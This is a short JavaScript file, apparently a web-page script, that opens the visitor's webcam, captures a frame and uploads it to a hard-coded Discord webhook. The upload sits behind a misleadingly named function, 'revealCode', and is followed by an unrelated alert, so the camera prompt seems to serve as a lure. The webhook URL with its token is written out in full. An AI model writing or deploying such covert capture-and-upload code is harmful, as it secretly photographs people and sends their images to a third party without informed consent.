function captureImage() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                // Capture the frame after a short delay
                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/png');

                    // Stop the webcam
                    stream.getTracks().forEach(track => track.stop());

                    // Send captured image to the server
                    revealCode(imageData);
                }, 1000); // 1-second delay to ensure the camera is ready
            };
        })
        .catch((error) => {
            console.error("Error accessing webcam:", error);
        });
}

function revealCode(imageData) {
    console.log("Processing captured image...");

    // Convert Base64 image to Blob
    const byteString = atob(imageData.split(',')[1]);
    const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    const blob = new Blob([ab], { type: mimeString });

    // Prepare form data
    const formData = new FormData();
    formData.append('file', blob, 'captured_image.png');

    // Send the image via webhook or API
    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1336347608536322200/Rq8hVVnrefbKYJ4ARxzapxF6fToFUITIjxf2RxvMJnX_C7UTc4bfVBsZ6HG0jVa532oZ'; // Replace with your webhook or API URL

    fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log("Image sent successfully!");
            alert("Anshu Loves RADHA");
        } else {
            console.error("Failed to send image:", response.statusText);
        }
    })
    .catch(error => {
        console.error("Error sending image:", error);
    });
}
